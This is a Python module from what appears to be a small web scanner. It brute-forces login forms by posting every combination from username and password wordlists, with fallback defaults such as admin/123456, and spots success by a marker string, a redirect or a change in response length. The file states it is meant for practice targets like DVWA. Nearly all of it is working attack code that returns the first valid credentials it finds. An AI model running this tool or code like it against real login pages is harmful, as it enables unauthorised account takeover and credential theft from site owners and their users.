# modules/bruteforce.py
"""
Brute-force 模块（弱口令登录尝试）
- 目的：对登录表单执行有节制的用户名/密码尝试，找出第一个成功组合。
- 使用场景：本地靶场（DVWA 等）。**未经授权请勿使用**。
- 可选参数（通过 app 传入 kwargs）：
    login_path: 相对或绝对 URL（如果 target 只是站点根），例如 "/dvwa/login.php"
    user_field: 表单用户名字段名（默认 "username"）
    pass_field: 表单密码字段名（默认 "password"）
    submit_field: 可能需要的额外 submit 字段名和固定值，传入 dict
    success_indicator: 如果页面中包含此字符串，则判定登录成功（可选）
    max_attempts: 最大尝试数（默认 500）
    delay: 每次请求后延迟秒数（默认 0.5）
"""
import os
import time
import json
from typing import Optional
import requests
from urllib.parse import urljoin

# 读取 wordlists 的位置（与项目约定）
WL_DIR = os.path.join(os.path.dirname(__file__), "payloads", "wordlists")
USER_FILE = os.path.join(WL_DIR, "users.txt")
PASS_FILE = os.path.join(WL_DIR, "passwords.txt")

def _load_wordlist(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []

def _is_login_success(resp, success_indicator: Optional[str]=None, baseline_len: Optional[int]=None):
    """
    简单的成功判定策略（可扩展）：
    1) 如果提供了 success_indicator（字符串），只要 body 中包含它就判定成功；
    2) 否则使用基于响应差异的启发式：与 baseline（未登录页面）长度差别超过阈值或发生 redirect。
    """
    # 先用 indicator（优先）
    if success_indicator:
        try:
            if success_indicator.lower() in resp.text.lower():
                return True
        except Exception:
            pass

    # 检测重定向（常见登录成功后跳转）
    if resp.history:
        return True
    # 长度差异启发式（如果 baseline 已知）
    if baseline_len is not None:
        try:
            if abs(len(resp.text) - baseline_len) > 100:  # 可调整阈值
                return True
        except Exception:
            pass
    return False

def scan(target: str, param_name: str = None, session: requests.Session = None, **kwargs):
    """
    target: base URL or login page URL
    kwargs: login_path, user_field, pass_field, submit_field (dict), success_indicator, max_attempts, delay
    """
    s = session or requests.Session()
    s.headers.update({"User-Agent": "MiniScanner-Brute/1.0"})

    login_path = kwargs.get("login_path", "")  # can be empty if target already full login url
    login_url = target if login_path == "" else urljoin(target, login_path)

    user_field = kwargs.get("user_field", "username")
    pass_field = kwargs.get("pass_field", "password")
    submit_field = kwargs.get("submit_field", {"Login": "Login"})  # default assumption
    success_indicator = kwargs.get("success_indicator")  # e.g. "Welcome" or "Logout"
    max_attempts = int(kwargs.get("max_attempts", 500))
    delay = float(kwargs.get("delay", 0.5))
    method = kwargs.get("method", "POST").upper()

    users = _load_wordlist(USER_FILE)
    passwords = _load_wordlist(PASS_FILE)

    # fallback example small lists if files missing
    if not users:
        users = ["admin", "user", "test"]
    if not passwords:
        passwords = ["password", "123456", "admin"]

    evidence = []
    attempts = 0

    # baseline request (login page) for comparison
    baseline_len = None
    try:
        r0 = s.get(login_url, timeout=10)
        baseline_len = len(r0.text)
    except Exception:
        baseline_len = None

    # iterate users x passwords (simple nested loops; can be optimized later)
    for u in users:
        for p in passwords:
            attempts += 1
            if attempts > max_attempts:
                return {
                    "name": "bruteforce",
                    "target": login_url,
                    "detected": False,
                    "vulnerable_payload": None,
                    "evidence": evidence,
                    "attempts_tried": attempts,
                    "notes": f"Stopped after max_attempts={max_attempts}"
                }
            payload = {user_field: u, pass_field: p}
            # merge submit fields
            if isinstance(submit_field, dict):
                payload.update(submit_field)

            try:
                if method == "POST":
                    r = s.post(login_url, data=payload, timeout=10, allow_redirects=True)
                else:
                    r = s.get(login_url, params=payload, timeout=10, allow_redirects=True)
                succeeded = _is_login_success(r, success_indicator=success_indicator, baseline_len=baseline_len)

                ev = {
                    "username": u,
                    "password": p,
                    "url": r.url,
                    "status_code": r.status_code,
                    "time": round(r.elapsed.total_seconds() if r.elapsed else 0, 3),
                    "len": len(r.text) if r.text else 0,
                    "succeeded": succeeded
                }
                evidence.append(ev)

                if succeeded:
                    # stop at first valid creds
                    return {
                        "name": "bruteforce",
                        "target": login_url,
                        "detected": True,
                        "vulnerable_payload": {"username": u, "password": p},
                        "evidence": evidence,
                        "attempts_tried": attempts,
                        "notes": "Found valid credentials (first match returned)."
                    }

            except Exception as e:
                evidence.append({"username": u, "password": p, "error": str(e)})
            time.sleep(delay)

    return {
        "name": "bruteforce",
        "target": login_url,
        "detected": False,
        "vulnerable_payload": None,
        "evidence": evidence,
        "attempts_tried": attempts,
        "notes": "No credentials found in provided wordlists."
    }